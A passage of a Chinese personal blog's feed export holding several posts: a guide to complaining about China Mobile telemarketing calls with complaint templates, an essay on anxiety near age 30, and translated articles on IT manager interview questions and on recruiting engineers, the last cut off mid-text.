        <content type="html"><![CDATA[<p>近期应该有不少人收到了如下短信，有来自中国移动的，也有来自中国联通的，</p><p><img src="/../blogimgs/2019/05/06/10086-pm.png" alt="upload successful"></p><p>移动和联通会同时发出这条信息，十有八九是收到了工信部的要求，背后的缘由本文不做过多的猜测。笔者亦是备受各类营销推广类电话的骚扰，频繁时每天能接到三四个，萧条期也能隔三差五收到一两个。近期可能因为手机流量购买频繁，大约三四个月前开始，几乎每周都有来自中国移动（相关）公司的流量套餐推广电话，笔者怒了，打算与他们抗争到底，欲彻底断绝此类骚扰，故有了一段长达约一月的投诉史，积攒了些经验，分享给大家。</p><h3 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h3><p>期望通过此文，告诉普通群众几条常用的合法投诉渠道，以及在投诉过程中你可能会遇到的阻碍；另外也期望更多人看到此文后，行动起来，当一件事情成为高频出现的热点时，相关公司和相关部门才会将此事提到足够的优先级。</p><h3 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h3><p>先说说我持续投诉一个月的成果，我先后向移动公司 10086、工信部和市长热线几个渠道进行申诉，期间不断通过自媒体渠道披露申诉细节和申诉结果，最后 10086 的客服给我的承诺是：</p><ul><li>经理或以上级别员工向我电话或书面致歉</li><li>通知各个营业分部，将我的手机号码拉黑处理</li><li>历史骚扰，赔偿 100 元，以话费形式打款</li><li>未来每次骚扰我，补偿 50 元话费&#x2F;次；对营业分部罚款 200 元&#x2F;次</li></ul><p>以上是中国移动能够给我的承诺，和我个人申诉中提到的要求相差比较大，我个人的要求是：</p><ul><li>每次骚扰赔偿 100 元</li><li>历史骚扰加上投诉花费我的个人时间，按照我的时薪计算，赔偿我 1800 元</li><li>如可以保证未来无骚扰电话，则无需任何赔偿</li></ul><p>经过辗转多次的投诉后，已经有两三周没有收到骚扰电话了，所以我暂停了投诉，直到下次收到骚扰电话，我会采用法律手段维权。</p><h3 id="投诉阻碍"><a href="#投诉阻碍" class="headerlink" title="投诉阻碍"></a>投诉阻碍</h3><p>下面我来一一列举下，投诉过程遇到的“阻碍”和处理办法：</p><h4 id="1-首次拨打-10086，告知会给你在系统添加防骚扰标记"><a href="#1-首次拨打-10086，告知会给你在系统添加防骚扰标记" class="headerlink" title="1. 首次拨打 10086，告知会给你在系统添加防骚扰标记"></a>1. 首次拨打 10086，告知会给你在系统添加防骚扰标记</h4><p>10086 会维护一个名单列表，如果用户告知不允许 10086 拨打套餐推广类电话，则会被加入到这个名单，未来就不会有来自移动公司的骚扰了。</p><p><strong>官方的骚扰不会有，但是合作方的骚扰不会停。</strong></p><h4 id="2-再次拨打-10086，告知安装防骚扰软件"><a href="#2-再次拨打-10086，告知安装防骚扰软件" class="headerlink" title="2. 再次拨打 10086，告知安装防骚扰软件"></a>2. 再次拨打 10086，告知安装防骚扰软件</h4><p>为减少本次不必要的交涉，请早早地安装诸如 360 安全卫士、腾讯安全卫士之类的软件，并根据软件中关于防止骚扰的设置提示进行设置。</p><p>但一般此类软件只会对骚扰电话做标注，比如“外卖”、“出租车”、“保险推广”之类，有些号码不在软件的名单库中，则不会标注；并且这些软件并不会自动挂断骚扰电话，需要人肉挂断，不能真正起到防骚扰的效果。</p><p><strong>所以你就回复客服，软件安装了，没有效果。</strong></p><h4 id="3-再次拨打-10086，告知可设置屏蔽所有电话"><a href="#3-再次拨打-10086，告知可设置屏蔽所有电话" class="headerlink" title="3. 再次拨打 10086，告知可设置屏蔽所有电话"></a>3. 再次拨打 10086，告知可设置屏蔽所有电话</h4><p>这里的屏蔽所有电话指的是，10086 提供了一项服务，可以做到，任何电话打过来的时候，对方需要根据 10086 的语音提示输入四位安全验证码，对方输对了验证码，电话才会真正打到你的手机。</p><p>这个服务显然不适合我们，试想下，年迈的父母给你打电话，还得输个验证码？公司老板给你打电话，每次都让他输个验证码？</p><p><strong>所以你就回复客服，不开启这个功能</strong>，其实这个功能本身也不是为普通用户设计的。</p><h4 id="4-继续投诉-10086，却被告知不要相信非官方电话"><a href="#4-继续投诉-10086，却被告知不要相信非官方电话" class="headerlink" title="4. 继续投诉 10086，却被告知不要相信非官方电话"></a>4. 继续投诉 10086，却被告知不要相信非官方电话</h4><p>由于骚扰电话一般是营业厅的座机或者营业员的私人手机打过来的，非 10086 官方号码，所以客服会告诉你，不要相信此类电话，此类电话与中国移动公司无关。</p><p>很明显，他们在推卸责任对吧，你跟他拌嘴，他们会坚持告诉你，不要相信，不要相信，不要相信，怎么办？</p><p><strong>请通过骚扰电话直接购买套餐，销售员会让你提供通过 10086 发送的验证码，你可以勇敢地告诉他，然后你会发现你的套餐会立即变更，没关系，不着急。看下一步。</strong></p><p>注意：这里要注意了，一定是 10086 发过来的验证码才能相信，不排除诈骗电话的可能性。</p><h4 id="5-继续投诉-10086，并要求取消套餐，会被告知向上反馈"><a href="#5-继续投诉-10086，并要求取消套餐，会被告知向上反馈" class="headerlink" title="5. 继续投诉 10086，并要求取消套餐，会被告知向上反馈"></a>5. 继续投诉 10086，并要求取消套餐，会被告知向上反馈</h4><p>先让客服帮你查询套餐变更情况，确认套餐已经变更。</p><p>本次投诉，你告诉他，为了证明之前的骚扰电话与中国移动公司有关（你们客服说与你们无关），所以购买了套餐，请取消套餐变更，另外投诉这个销售员和移动公司：</p><ul><li>移动公司为何授权这个销售员通过 10086 发送短信</li><li>投诉移动公司（销售员）骚扰</li></ul><p>此时你就可以要求赔偿，骚扰了你，并浪费了你的时间，打扰了你的休息；且此事已经证明与移动公司有关，请移动公司不要再推卸责任。</p><p><strong>但是我不建议你此时索赔，因为你的目的是减少骚扰，请继续投诉，要求他们的上级领导给你回复，保证不再有类似的骚扰电话过来！</strong></p><p>期间你会多次收到来自 10086 的回电，告知无法给出承诺，并反复给出第 1、2、3、4 条方案来恶心你。</p><h4 id="6-向工信部-12300-投诉，请使用邮件投诉"><a href="#6-向工信部-12300-投诉，请使用邮件投诉" class="headerlink" title="6. 向工信部 12300 投诉，请使用邮件投诉"></a>6. 向工信部 12300 投诉，请使用邮件投诉</h4><p>先在网上找到你手机归属地所在的工信部邮箱（不同城市貌似不一样），然后详细地说明问题，要注意几点：</p><ul><li>我已经多次向 10086 申诉，无法解决电话骚扰问题</li><li>10086 不承认是他们公司打过来的电话，投诉移动公司泄露用户隐私数据给三方或合作伙伴</li><li>强烈要求赔偿，对，这一步索赔，<strong>索赔请找工信部，不要找 10086 客服</strong></li></ul><p>我给出一个投诉模板（见附录一），以供参考。</p><p><strong>一般三天内会有一个经理级别的客服通过 10086 给你回电，如果对方气场比较强大，你就记住一句话，“必须赔偿，并要求不再受到骚扰电话”。对方如果继续解释，就强调继续投诉中国移动违法泄露用户隐私数据，如泄露电话号码、历史消费记录等信息给非移动官方人员。</strong></p><p>此时不出意外，他们应该会提出我在「效果」章节中提到的方案。</p><p>注意：方案中的 50 元话费，他可能会说成「奖励」，移动公司奖励你的举报；此时，你不应该接受！这必须是赔偿，性质不一样。<strong>如果他非要说奖励，你可以回复，接受你们的奖励，但同时要求赔偿！</strong></p><p>如果没有谈妥，还可以向工信部申请调解，我给了一个调解模板（见附录二）。</p><h4 id="7-相信你仍然没有获得期望的结果，此时再通过市长热线投诉"><a href="#7-相信你仍然没有获得期望的结果，此时再通过市长热线投诉" class="headerlink" title="7. 相信你仍然没有获得期望的结果，此时再通过市长热线投诉"></a>7. 相信你仍然没有获得期望的结果，此时再通过市长热线投诉</h4><p>市长热线的投诉电话是 12345，你可以告知已经向客服投诉无果，向工信部投诉没有获得期望的结果。</p><p>有些城市的市长热线办事效率和效果还是不错的，可以在工信部投诉的同时或之后拨打。</p><p>如果移动公司一直推脱或表示无法承诺解决问题，你可以强烈要求将你在各个销售部或营业厅拉黑，既然移动公司可以对一个销售部进行处罚，那么当然也可以联系到所有的销售部或营业厅，将你拉黑。</p><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p><strong>投诉是一件漫长的事情，不要不耐烦，当做一种乐趣便好了。</strong> 我希望通过此文，能够帮你争取到部分赔偿，同时更希望运营商和相关部门能够重视起这件事情。</p><p>其实，不仅仅是移动&#x2F;联通的骚扰，其他类型，尤其是以 <code>95</code> 开头的骚扰电话，络绎不绝。我们可以先把矛头指向这些大公司，让相关部门引起重视，然后祈祷未来会变好…</p><hr><p><strong>附录一，向工信部 12300 的邮件申诉模板：</strong></p><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">## 申诉人信息</span><br><span class="line"></span><br><span class="line">姓名：XX</span><br><span class="line">电话：XXXXXXXX</span><br><span class="line">邮箱：XXXXXX@XXX.com</span><br><span class="line"></span><br><span class="line">## 申诉对象</span><br><span class="line"></span><br><span class="line">10086，移动公司</span><br><span class="line"></span><br><span class="line">## 问题描述</span><br><span class="line"></span><br><span class="line">1、[问题] 移动公司（或其合作部门）长期较高频率地打电话让用户更换/购买手机流量套餐，对我造成严重骚扰；</span><br><span class="line">2、[投诉] 多次向 10086 投诉（超过 5 次），客服说已经将我设置了「推广免打扰」的标记，他们的工作人员看到后，不会再给我打推广电话，然后每次都没有解决问题，依然有骚扰电话打过来；</span><br><span class="line">3、[回电] 10086 工号为 9583 以及另外一位客服回电说，电话不是官方打出来的，他们查不到推销人员的部门归属，无法帮我解决问题，且下次投诉依然是这个回复；</span><br><span class="line">4、[问题确认] 后来我通过电话为 1366****6378 自称王*云的销售人员购买了流量套餐，购买后向 10086 确认，发现套餐确已变更。那么这可以证明电话推广确系移动公司（或其合作部门）打出，确系为移动公司（或其合作部门）骚扰用户。</span><br><span class="line"></span><br><span class="line">## 投诉内容</span><br><span class="line"></span><br><span class="line">1、投诉移动公司电话骚扰用户</span><br><span class="line">2、投诉移动公司将我的个人信息泄露给三方（或其合作部门），让骚扰电话不断打过来</span><br><span class="line">3、投诉工号为 9583 的客服人员，不负责任</span><br><span class="line"></span><br><span class="line">## 期望结果</span><br><span class="line"></span><br><span class="line">1、未来不要让移动公司流量套餐相关的推广电话打进我的手机，如果有，期望移动公司以100元/次接听计费向我付费</span><br><span class="line">2、移动公司经理及以上级别领导向我电话或书面或官方微博道歉</span><br></pre></td></tr></table></figure><p><strong>附录二，调解模板</strong></p><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">## 申请调解</span><br><span class="line"></span><br><span class="line">我的调解诉求是，如果中国移动公司不能承诺未来不给我打骚扰电话，我将要求赔偿，赔偿内容为：</span><br><span class="line"></span><br><span class="line">1. 历史骚扰次数（超过 8 次，算 8 次），每次 100 元的赔偿费（如果移动公司称之为奖励，我拒绝），800 元</span><br><span class="line">2. 按照我的平均时薪，赔偿我接听电话、投诉、查资料、收集证据等花费的时间，折算约 1000 元，如有需要，我可以提供工资证明和计算方法</span><br><span class="line"></span><br><span class="line">共计 1800 元，以中国移动公司的名义打入我的个人支付宝账户（与之前提供的电话号码一致）。如果可以承诺后续无骚扰电话，则无需赔偿。</span><br><span class="line"></span><br><span class="line">## 后续投诉</span><br><span class="line"></span><br><span class="line">赔偿后，未来骚扰次数若超过 5 次，我会继续投诉，继续要求赔偿。</span><br><span class="line">如果中国移动公司不接受我的诉求，我会采用法律手段维权；也会质疑和投诉 12300 作为监管部门的监管不力。</span><br><span class="line"></span><br><span class="line">## 给相关部门的建议</span><br><span class="line"></span><br><span class="line">建议参考国外 FTC（联邦贸易委员会）的策略，维护一份全国不愿接听销售电话的号码列表，当用户将号码注册进去以后，如果再有销售打电话过来即为违法，FTC 可对其处以每次电话最高 41484 美元的罚款，参考官网：https://www.donotcall.gov/</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 投诉 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>30 岁的焦虑和惆怅</title>
      <link href="/blog/2019/05/04/30-years-old-coming-soon/"/>
      <url>/blog/2019/05/04/30-years-old-coming-soon/</url>
      
        <content type="html"><![CDATA[<p>本来已经爬到床上准备睡了，脑子里有几件事情萦绕不绝，想了想，还是起身写下点东西。或许可以随着键盘敲击的节奏，稍稍回忆下过去，反思下现在自己，展望一下未来。</p><h3 id="过去"><a href="#过去" class="headerlink" title="过去"></a>过去</h3><p>从大学开始，我就一直活在焦虑之中，为未来的不确定而焦虑，所以会经常习惯性地去考虑未来的事情；单身的时候想的是自己的，恋爱的时候想的是两个人的，生了娃以后想的是家庭的；不过，也可能是因为有了老婆的缘故，很多家庭相关的事情就不太愿意动脑子，大多都让老婆去想了；不过自己内心的那支焦虑之炬还从未熄火。</p><p>我生于 92 年，准确地说，现在是 26.5 岁，离 30 还有一段路程，可是这种似乎 30 岁男人比较常见的焦虑感时而浮现在我的内心（早熟么？），让我不得不好好反思和规划一下。</p><p>我比很多人要幸运，大二的时候就明确了自己的职业方向，所以大学里我便投入了许多精力专注于一个方向，那时也有幸加入了校内非常不错的技术团队，得到了几位优秀学长的指导（解答了我无数个为什么），技术上的实践很多；加上 13 年的时候在百度实习了几个月，让我对团队、业务这些学校触碰很少的概念有了比较清晰的印象；因此，在 14 年的阿里校招，我才能顺利地加入淘宝网。</p><p>印象中，大学里的我，是个比较内敛羞涩的男孩；后来也不知道是怎么锻炼出来的，不管对着什么人，遇到感兴趣的话题总能唠个不停，用我老婆的话说是“脸皮超级厚”。</p><h3 id="现在"><a href="#现在" class="headerlink" title="现在"></a>现在</h3><p>人生的几件大事，我超出父母预期给提前办好了，买房买车结婚生娃，如今爸妈只希望我能够稳稳当当地过好日子，可是我天生就不是“过日子”的人，持续六七年的焦虑前行，让我把焦虑当成了习惯，有的时候我会因为多玩了一把斗地主而感到愧疚…</p><p>这两年，我更加焦虑了。焦虑的原因很简单，因为我担心自己不能保持焦虑感，担心自己会松懈下来；这两年因为家庭、孩子等原因，让我的生活稍微放慢了一点，但“慢”这个姿势似乎与我是不兼容的，故而会出现标题中的“焦虑和惆怅”。</p><p>慢慢地，在适应。</p><p>好像很多时候，我们周遭的事情是无法被改变的，能改变的只有自己，让自己的兼容性变得更好，才能在复杂的环境中生存下来。</p><p>我的孩子一岁了，在过去的一年里，虽然我不是家里最累的，但也累的跟狗没啥两样。以前我的观点是，“娃是用来逗，娃是个有趣的东西”，那时果然太年轻，有了娃以后，才知道，“父母才是用来逗乐的”。孩子的成长需要父母的陪伴，“陪伴”这个词真的是意味深长，或许「父亲」这个身份，需要一辈子来适应吧…</p><p>在家里，因为孩子的缘故，我的地位已经下降了太多，因此，不想说太多。只能是，“痛，并快乐着”。工作方面，可能是我对自己的要求变得更高了，倒开始有些不满意起来。我很清楚自己想要什么，但也经常会迷失在前行的浓雾之中。</p><h3 id="未来"><a href="#未来" class="headerlink" title="未来"></a>未来</h3><p>马上工作的第五个年头就要到来，这也给了我第一次回头看五年的机会。五年时间，我变化了很多。想想过去的五年里我计划了的，达成了的，错过了的，再来盘算下未来五年，或许能够多一丝全盘掌控的底气。</p><p>我不知道未来会有哪些新的挑战和变化，先想几点我觉得需要变化或者达成的内容，摆放在这里，过几年再回来看看：</p><ul><li>掌握提升读书的效率和质量的方法；多读书，读好书</li><li>提升知识结构化程度；夯实基础，重塑技术架构</li><li>技术沉淀；在团队或者社区留下高质量的技术脚印</li><li>提升自我管理和团队管理技能；带领团队成功</li><li>提升英语；达到国外生活所需水平</li><li>找到旅游的乐趣；在国内外多留下脚印</li><li>降低“陪伴”的兼容性成本；成为孩子的朋友</li><li>发展至少一门爱好；找到乐趣，常年坚持</li><li>削减锐气，收敛剑锋；增加共赢的概率</li><li>拥有良好的身体；每年体检指标正常</li></ul><p>争取 30 岁的时候回首，能够少些焦虑和惆怅吧~</p>]]></content>
      
      
      <categories>
          
          <category> 观点和感想 </category>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 30岁 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IT 管理岗面试热门问答 Top 30</title>
      <link href="/blog/2019/04/23/top-30-it-manager-interview-qa/"/>
      <url>/blog/2019/04/23/top-30-it-manager-interview-qa/</url>
      
        <content type="html"><![CDATA[<blockquote><p>原文地址：<a href="https://resources.infosecinstitute.com/top-30-information-technology-it-manager-interview-questions-and-answers-for-2019/">Top 30 Information Technology (IT) Manager Interview Questions and Answers for 2019</a><br>原文时间：2019年3月7日<br>翻译计划：<a href="https://github.com/barretlee/translation-plan">https://github.com/barretlee/translation-plan</a><br>翻译人员：<a href="https://www.barretlee.com/about/">小胡子哥</a></p></blockquote><h3 id="概要"><a href="#概要" class="headerlink" title="概要"></a>概要</h3><p>IT 岗是一项富有变化且让人激动的挑战工作，它为一些人带来了管理机会。在你的职业生涯中，成为一名 IT 管理者会是一个重要的里程碑。</p><p>如果你和大多数人一样，在面试之前会有点紧张，那么，不妨看看我们汇总了一系列问题，它会帮助你在面试的时候避过雷区，同时我们也期望给你带来一些思考。IT 管理者融合了多重角色，面试时会有收到来自不同领域的灵魂拷问。我们收集了三十多个问题，归为如下三类：<strong>技术能力、管理技能和沟通技能</strong>。每一类都会帮你更好地理解 IT 管理者这个角色。</p><p>其中一些问题是管理方面的通用问题，另外一些侧重于 IT 技术领域，但是这两类问题对于这个角色都至关重要，所以如果你正准备面试，不妨好好看看这些问题，将会很有裨益。</p><h3 id="技术能力"><a href="#技术能力" class="headerlink" title="技术能力"></a>技术能力</h3><p>对面试官来说，判断你是否可以进入面试是一件很轻松的事情，他们只需要稍微撇一眼你的简历就行了。他们真正关心的是你在实际工作中，会如何处理技术挑战，如何让合适的人解决问题，以及是否会亲自处理一些问题。</p><p>对 IT 管理者来说，并非一定需要拥有技术背景，一些公司更看重 IT 部门的财务能力和监管能力，当然也非全部。这些 IT 管理者需要具备该领域的实践经验，以便他们能够在系统故障时正确处理，并对公司内部高管的问题做出适当的回应。</p><p>不同公司对 IT 管理者的要求是不一样的，中小型公司期望你在公司繁忙阶段干点实事、解决问题，而大型公司可能会分派给你非常具体的工作内容。面试时，技术方面的问题主要包括：你个人如何提升技能和自我学习，以及作为一个管理者应该如何提升自己等。</p><blockquote><p>下面十个问题都有一小段注解，因文章过长，未翻译</p></blockquote><ol><li>介绍你的技术背景，如有.</li><li>你会亲自处理技术问题么？</li><li>你倾向于将任务外包出去还是用来培养内部人才？</li><li>描述下你当前的角色.</li><li>你为 IT 部门创造了什么价值？</li><li>你如何看待员工自我提升和学习的问题？</li><li>你认为提升员工的能力是你的责任还是他们自己的责任？</li><li>你如何衡量部门的技术表现？</li><li>你从当前的雇主那里有学到哪些管理经验？</li><li>你有项目管理的经验么？</li></ol><h3 id="管理问题"><a href="#管理问题" class="headerlink" title="管理问题"></a>管理问题</h3><p>作为 IT 管理者的很大一部分工作就是管理人和资源，这一章节将聚焦在这两个方面。每个人的管理风格都不太一样，所以如果你没有按照下文所述的内容去执行也不用担心，仅供辅助思考。</p><blockquote><p>下面十个问题都有一小段注解，因文章过长，未翻译</p></blockquote><ol start="11"><li>你觉得担任 IT 经理最重要的职能是什么？</li><li>你如何处理工作中的失误？</li><li>你能给我们公司带来的最有价值的贡献是什么？</li><li>你做 IT 管理有多长时间了，你管理过多少人？</li><li>说说你带过的几个技术项目.</li><li>形容下你的管理风格.</li><li>如何看待你近十年的履历.</li><li>员工不符合预期，处理他们的最佳办法是？</li><li>当团队出问题的时候，你如何激励你的团队？</li><li>你是否对属下有过负面反馈，是否辞退过员工？</li></ol><h3 id="沟通问题"><a href="#沟通问题" class="headerlink" title="沟通问题"></a>沟通问题</h3><p>你与团队成员、上司和高管的沟通方式会因每个团队而不同。有时，面试官可能期望了解你是如何对不同等级的人沟通的，以及在遇到紧急情况时你能够向受影响的人传递怎样的信息；另外，也想了解你对整个业务的熟悉程度，当系统故障导致业务停止或者离线时，会影响哪些关联业务和系统，这个时候你会如何及时与正确的人进行沟通等。</p><p>这部分的问题将涵盖比较多的话题，包括内部流程、故障恢复和沟通等等。</p><blockquote><p>下面十个问题都有一小段注解，因文章过长，未翻译</p></blockquote><ol start="21"><li>在危机时刻，你如何将重要信息传递给高层管理人员？</li><li>你如何管理故障恢复？</li><li>在项目管理中，你最强的技能是？</li><li>你遇到过的最大的 IT 从业相关的挑战是？</li><li>你如何同时处理多个项目截止时间？</li><li>文档对你有多重要？</li><li>基于我们之前所聊，你觉得可以对 IT 部门作出哪些改变</li><li>在获取心的软件或硬件时你会如何协商？</li><li>你如何确保公司数据的安全性以及操作不受安全漏洞或事件的影响？</li><li>沟通对你的管理策略有多重要？</li></ol><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>面试管理岗的职位通常会让人有点压力，即使你在这个方向已经有了很长的经验。毕竟，是否能够高效带领团队决定了公司能否走向成功，因为团队停止工作，即使只有一分钟，那也是在浪费公司的资源，你需要让你的团队一直处于工作状态。</p><p>记得在面试之前练习下回答这些问题，思考下你会为这些问题准备怎样的答案。提前思考，会让你在面试的时候回答得更自然，更好地展现你的个人能力！</p><hr><p>译者注：这篇文章比较长，每个问题后面都有一小段注解，我觉得重要的是问题，答案感兴趣的话，读者可以去原文查看。</p><p>逐字逐句的翻译真的是浪费生命，后续的翻译我会根据自己习惯的语序和风格翻译大概的意思，省时省力，太多国外的作者在表达的时候不注重前后逻辑，翻译起来异常痛苦。当然，也可能是我理解能力的问题 ；）</p><p>后续翻译也尽量不选择长文，翻译起来实在是太费时间了，如果每篇文章都是超级长文，我估计今年没有办法实现 100 篇的翻译目标了&#x3D;。 &#x3D;</p>]]></content>
      
      
      <categories>
          
          <category> 翻译 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 译文 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何招聘和留住优秀的工程师</title>
      <link href="/blog/2019/03/19/how-to-recruit-and-retain-great-engineers/"/>
      <url>/blog/2019/03/19/how-to-recruit-and-retain-great-engineers/</url>
      
        <content type="html"><![CDATA[<blockquote><p>原文地址：<a href="https://hackernoon.com/how-to-recruit-and-retain-great-engineers-91227165d23d">How to Recruit and Retain Great Engineers</a><br>原文时间：2019年3月12日<br>翻译计划：<a href="https://github.com/barretlee/translation-plan">https://github.com/barretlee/translation-plan</a><br>翻译人员：<a href="https://www.barretlee.com/about/">小胡子哥</a></p></blockquote><p>我一直特别担心把优秀的人才带到我们团队。许多年过去了，我现在仍然担心。作为一个人事经理经常听到的一句陈词滥调是：“你永远不应该停止招聘！”。这也从侧面说明了，招聘优秀的工程师是多么的难，尤其是在这个时代。为此，我想记录一些我个人以及我看到的其他经理使用过的一些经验——企业在不同阶段如何去招聘、聘用和留人。</p><p>你在创业公司和在大公司会收到截然不同的简历。在这篇文章中，我将分两个章节分别讲述这两个阶段如何招聘和留住优秀的工程师。领英的创始人 Reid Hoffman 在他的新书 <a href="https://www.blitzscaling.com/">Blitzscaling</a> 中分解了公司在两个不同的阶段你需要招聘的不同类型的人，我觉得写得非常好（我推荐这本书并不是因为他在书里面提到了 Jet 公司）。</p><p>Hoffman 先生在书中使用军队术语作为例子来说明不同阶段你需要招聘不能不同类型的人：</p><ul><li>在早期你需要去招聘海军作战人员，他们已经做好了在沙滩上迎接暴风雨，在非常恶劣的环境下工作的准备。他们为了生存，分寸必争！</li><li>下一阶段需要招聘陆军作战人员，这个阶段的公司拥有了自己的产品，他们需要尽快帮助公司快速建立生存堡垒，并为公司占据更大的市场份额。</li><li>最后，便需要去招聘警察，他们来维护规则、秩序和稳定性。在这个阶段，公司应该已经具备了很大的规模，并已经完成了进一步的市场扩张。</li></ul><p>书中也提到，你可以指望海军和陆军在一起好好工作，也可以指望陆军和警察在一起好好工作，但是你绝对不要想着海军能够跟警察在一块儿完美配合。虽然他概括的是技术性公司，不过我觉得他提到的“在不同阶段所需要的不同类型的工程师”说的尤为准确。</p><h3 id="在初创公司招聘和聘用工程师"><a href="#在初创公司招聘和聘用工程师" class="headerlink" title="在初创公司招聘和聘用工程师"></a>在初创公司招聘和聘用工程师</h3><p>当你还在初创公司的时候，招聘高级程序员类似于做企业销售，这是一个非常漫长而又艰难的过程。你需要不断地去追求和说服人选，以至于他们愿意放弃当下的高薪工作，并冒着一定的风险加入你。这就是为什么推荐是迄今为止最重要的工程师人才来源（_译者：不知道这个结论怎么得出来的…_）。</p><p>对早期的初创公司而言，有钱是远远不够的。不要想着因为有钱，别人就会加入。Jet 当初就是一家资金雄厚的初创公司，但我们跟其他公司一样，也是挣扎求生，不得不与市场一起发展。其实，仅仅承诺我们有改变市场的雄心和抛出复杂的技术问题是远远不够的，仅仅拥有免费的小食和乒乓球台也是远远不够的。这些东西，我们以前有，现在也有，然而却并没有真正实际去影响工程师的选择。这些只是加分项，就像提供无限制的休假和大量购买图书一样，它们只是在一个薪水还不错的公司里面最好应该具备的。如果这些东西便可以把优秀的工程师忽悠进来，那么我相信，他在这个团队中也不会长久的。</p><p>人们加入初创公司是因为他们想学习，有上进心，期望成长。从我个人的经验来看，正因为这个原因，他们才会在薪酬方面有一些退让。就像上大学，意味着你需要付钱给他们教你技能和知识，加入到初创公司自然也意味着你会学到相当多的东西，到最后你会觉得我为此付出的退让是值得的。这就是让一个优秀的工程师冒风险加入的原因。其实，即使你做的事情不能长久，即使这家初创公司倒闭了，你在这里学的东西，也是终身受用的。</p><p>对于很多工程师来说，成长有很多路径，他们可以去学习新的技能，如一门新的编程、设计和架构。而 Jet 公司就有很多类似的选择。我们使用 F#，这是一门函数式编程语言；我们在公有云上使用最新、最快的托管服务，让业务跑得更快；我们有面向领域驱动设计的是事件源架构等等。这些只是新员工过来之后需要做的部分事情，更不用说我们工作的规模和数据的体量是非常庞大的，更不用说我们可以和一群聪明的人在一起构建一个强大的产品服务上百万的用户。</p><p>但是，成长从来不仅限于新的技术，对一个高级的技术人员来说，他可以同时兼顾很多事情。比如在初创公司，工程师经常有机会在 Owner 一个系统的同时，去帮助管理一个小的团队。一般来说，大公司这些事情都是独立分配给不同的人的。</p><p>说到人事经理和技术领导者两个角色，在初创公司，你能够有机会同时在两个方向上成长。就拿我来说，在证明自己能力后的短短几个月内就获得了机会担任两个角色，我觉得非常棒；即使好几年过去了，再回想这个梦幻般的成就感，也只有创业公司能够赋予给我。在大公司，则需要花费很多年才能够爬上那些阶梯，当然，大公司相对稳定一点。作为工程师，我们需要在成就感和稳定上作出权衡。</p><p>我经常跟人们说，一个找对了方向小步快跑的创业公司一个月的产出等于一家大公司一年的产出量。这并非夸大，我们可以从交付成果、创造的价值和人才成长性上来看待这个问题。我看到不少人在小创公司一路从高级工程师走向总监再到总裁，这是在大公司可能需要花费几十年才能完成的成就。当然，前提是，你需要在前几年疯狂地工作。这并不一定适合所有的人，这里再次强调一下，需要作出权衡！许多人都渴望证明他们有能力，而在大公司他们可能没有机会去证明。</p><p>优秀的工程师在加入创业公司之前，毫无疑问需要考虑的一件事情是，他们能有一个公平环境下，通过努力工作来体现他们的价值。这一点毋庸置疑，十分重要。在早期，我们的 CTO 在这方面做得特别好，我十分钦佩他激励我们的这种方式。另外一个非常重要的因素是创始人、公司的愿景和公司文化。所有的人都朝着一个方向努力才能发挥最大的作用，不要低估一个人带着一群人齐头并进所产生的效果。</p><p>在早期初创阶段，非常重要的一点是，千万不能绝望，坚持你的激情，坚守职业道德，保持雄心壮志。如果你期望与聪明能干的人一起工作，那么，对自己保持高的要求，至关重要！</p><p>如上所述，把这些事情都做好在初创公司不是一件简单的事情，这需要大量的思考和努力。如果平时不去播种，不写文章，不回馈社区，不去感受自己与公司的发芽和成长，那么这些事情是不可能发生的。不气馁，将这一过程当做企业销售而不是客户销售，这将带来很大的胜利——给你带来一个强大的团队。</p><h3 id="在大公司招聘工程师"><a href="#在大公司招聘工程师" class="headerlink" title="在大公司招聘工程师"></a>在大公司招聘工程师</h3><p>事情在大公司办起来会稳妥一些，不像做企业销售，整个过程会拖上几个月，它更像是做客户销售。客户销售意味着需要制作商业广告以大量吸引可能有购买兴趣的客户。与企业销售不同，企业销售需要花费数月时间尝试向一个客户推销产品，而客户销售策略更多的是，通过吸引数百上千的客户进来，然后做好客户的留存。与大公司的招聘一样，客户销售是一个数字游戏。</p><p>我服务的公司之前是小创公司，现在是一家有钱的大公司，根据我的经验，那些一线工程师转为人事经理后，虽然去大公司应聘和去小公司应聘对待风险的态度不太一样，但是他们都有一个共同的特点：重视学习、成长、责任感，期望与聪明人一起工作，期望成为团队中优秀的一员。</p><p>对于一家大公司而言，拥有一种有利于工程职业发展的技术文化至关重要。这将意味着公司拥有一个职业阶梯，既支持个人技术贡献方向的成长，也支持人员管理方向的成长，并且允许团队将工程师提升为这两个角色。也就是说，允许存在 Tech Lead 和 Team Lead（Manager）两个角色。需要注意的是 Manager 也需要懂技术，我们在招聘 Manager 的时候会询问很多复杂的技术性问题，并且会准确的在技术上做权衡评估。优秀的技术人员期望被其他可靠的技术人员管理，因为他们了解工作的难度，并且还能在实践过程中给出适当的指导。</p><p>大公司，拥有较多的资源，应该适当允许工程师团队之间进行高水平竞争。此外，制定明确的晋升路径，并给工程师设定期望，让他们确切地知道自己长期努力在争取什么。</p><p>许多公司都会有：“选一个你喜欢的会议，去吧，我们买单！”。更进一步，建立一支卓越的技术团队，鼓励他们对使用这些外部学习福利，这会很有价值。比如 Jet 